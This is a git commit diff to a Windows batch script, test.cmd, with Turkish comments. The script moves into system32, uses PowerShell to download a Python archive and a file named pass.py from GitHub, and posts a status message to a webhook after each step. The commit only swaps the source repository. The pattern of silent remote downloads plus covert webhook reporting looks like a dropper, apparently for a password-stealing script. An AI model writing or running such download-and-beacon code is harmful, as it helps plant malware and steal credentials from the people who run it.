93a7e0a760f0ce3d26f8f02c5abef7d76cac2242
nizhenets <can@nizhenets.com>
2024-06-15 19:08:55 +0300

    t
    t

--- test.cmd
+++ test.cmd
@@ -23,7 +23,7 @@ cd system32
 
 :: Dosyaları indir
 powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python indirilmeye başladı\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/test/raw/main/python.zip' -OutFile 'Python.zip'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/Special_Script/raw/main/python.zip' -OutFile 'Python.zip'"
 echo Python.zip dosyası indirildi.
 powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"Python indirilme bitti\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
 
@@ -46,7 +46,7 @@ mkdir scripts
 echo scripts klasörü oluşturuldu.
 
 :: pass.py dosyasını scripts klasörüne indir
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/test/raw/main/pass.py' -OutFile 'scripts\\pass.py'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/Special_Script/raw/main/pass.py' -OutFile 'scripts\\pass.py'"
 powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"pass.py dosyası scripts klasörüne indirildi.\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
 echo pass.py dosyası scripts klasörüne indirildi.
 
